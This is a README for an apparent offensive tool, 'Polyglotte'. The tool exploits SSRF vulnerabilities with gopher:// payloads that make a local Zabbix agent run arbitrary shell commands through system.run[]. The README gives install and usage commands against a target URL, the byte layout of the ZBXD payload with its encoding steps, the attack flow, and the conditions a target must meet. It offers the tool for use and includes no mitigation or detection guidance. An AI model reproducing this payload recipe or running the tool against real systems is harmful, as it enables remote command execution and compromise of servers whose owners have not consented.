# 🧪 Polyglotte

**Polyglotte** is a lightweight offensive security tool designed to exploit **Zabbix SSRF vulnerabilities** by leveraging the **gopher protocol** to achieve command execution via the Zabbix agent.

---

## 🚀 Features

- Exploits SSRF vulnerabilities targeting Zabbix agents
- Supports **custom commands execution**
- Flexible HTTP request configuration:
  - Custom methods (GET, POST, etc.)
  - Custom headers
  - Request body support
- Customizable **gopher payload endpoint**
- Minimal dependencies and easy to use

---

## 📦 Installation

Clone the repository:

```bash
git clone https://github.com/raulfanti/polyglotte.git
cd polyglotte
```

Install dependencies:

```bash
pip install pwntools requests
```

---

## ⚙️ Usage

```bash
python polyglotte.py -c "<command>" -u "<vulnerable_url>"
```

### Example:

```bash
python polyglotte.py \
  -c "id" \
  -u "http://target.com/?url=EXPLOIT"
```

---

## 🔧 Arguments

| Argument | Short | Description |
|--------|------|-------------|
| `--command` | `-c` | Command to execute on the target system |
| `--url` | `-u` | Vulnerable URL containing `EXPLOIT` placeholder |
| `--method` | `-m` | HTTP method (default: GET) |
| `--data` | `-d` | Request body (for POST/PUT requests) |
| `--custom-gopher-url` | `-g` | Custom gopher endpoint (default: `gopher://127.0.0.1:10050/_`) |
| `--header` | `-H` | Custom headers (can be repeated) |

---

## 🧠 How It Works

Polyglotte abuses SSRF vulnerabilities that allow arbitrary URL fetching.

### Attack flow:

1. The application is vulnerable to SSRF
2. The attacker injects a **gopher payload**
3. The payload targets the local Zabbix agent (`127.0.0.1:10050`)
4. A crafted binary protocol request is sent:
   - Uses `ZBXD` header
   - Encodes a `system.run[]` command
5. The Zabbix agent executes the command
6. The response is returned through the SSRF channel

---

## 🧬 Payload Structure

The tool builds a payload based on the Zabbix protocol:

```
ZBXD\x01 + length + system.run[<command>]
```

Then it:

- Encodes it using `pwntools`
- Double URL encodes the payload
- Wraps it in a `gopher://` request
- Injects it into the vulnerable parameter

---

## 🎯 Requirements for Exploitation

- SSRF vulnerability allowing **gopher protocol**
- Target must have:
  - Zabbix Agent running
  - Accessible via `127.0.0.1:10050`
- Zabbix must allow `system.run[]` (not disabled)

---

## 🧪 Example with Custom Headers

```bash
python polyglotte.py \
  -c "whoami" \
  -u "http://target.com/api?url=EXPLOIT" \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 127.0.0.1"
```

---

## 👨‍💻 Author

**Raul Fanti**  
🔗 https://github.com/raulfanti  

---
